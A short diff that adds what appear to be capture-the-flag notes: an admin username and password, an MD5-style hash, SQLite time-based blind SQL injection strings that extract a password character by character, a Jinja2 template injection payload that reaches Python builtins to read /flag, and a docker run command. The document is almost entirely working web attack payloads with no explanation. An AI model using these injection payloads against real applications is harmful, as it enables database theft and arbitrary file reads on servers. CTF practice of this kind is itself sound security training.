@@ -1,0 +1,6 @@
+username:admin password:!@#$%^&*()_+
+04dde9f462255fe14b5160bbf2acffe8
+admin'and randomblob(1000000000) --
+admin'AND(SELECT(hex(substr(password,1,1)))FROM(users))=hex('6')AND(randomblob(1000000000))--
+{{''.__class__.__base__.__subclasses__().pop(78).__init__.__globals__.__builtins__.open("/flag",encoding="utf-8").read()}}
+docker run -p 8080:80 --name=web -d web:v1.1 /bin/sh -c "sh /etc/my_init.d/start.sh;while true; do ec ho hallo world; sleep 1;done"
